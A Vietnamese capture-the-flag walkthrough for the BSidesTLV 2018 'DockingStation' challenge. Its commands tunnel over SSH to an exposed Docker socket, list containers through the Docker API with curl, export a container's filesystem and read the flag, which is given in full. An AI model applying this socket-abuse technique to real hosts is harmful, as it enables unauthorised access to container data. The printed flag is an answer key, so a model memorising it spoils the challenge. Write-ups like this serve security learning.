Chạy command có trên description của challenge (lưu ý bỏ phần password và nếu web bị lỗi thì chuyển qua IP) <br/>
Chạy <code> ls -la</code><br/>
Mở một terminal khác, chạy lệnh sau <code>ssh bsidestlv@challenges.bsidestlv.com -p 2222 -NL localhost:3000:/app/docker.sock -f</code> (pass như trên) <br/>
Chạy <code>curl -s http://localhost:3000/containers/json?all=true</code><br/>
Lúc này sẽ ra một file JSON không dễ nhìn lắm, có thể xem ảnh đẹp của nó tại đây <a href="https://capearso.com/bsidestlv-misc/#dockingstation">Link</a> hoặc <a href="https://jctf.team/BSidesTLV-2018/DockingStation/">đây</a><br/>
Tìm <strong>Id</strong> của cái có <strong>Image</strong> là <code>galf</code> ở gần trường <strong>Port</strong><br/>
Chạy <code>curl -s -o galf.tar http://localhost:3000/containers/&gt id của bạn &lt/export</code><br/>
Giải nén tar bằng lệnh <code> tar -xvf galf.tar</code><br/>
Cờ sẽ nằm ở folder <code>/home/flag_is_here</code><br/>
Cờ là <code>BSidesTLV{i_am_r34dy_t0_esc4p3_th3_d0ck3r!}</code><br/>
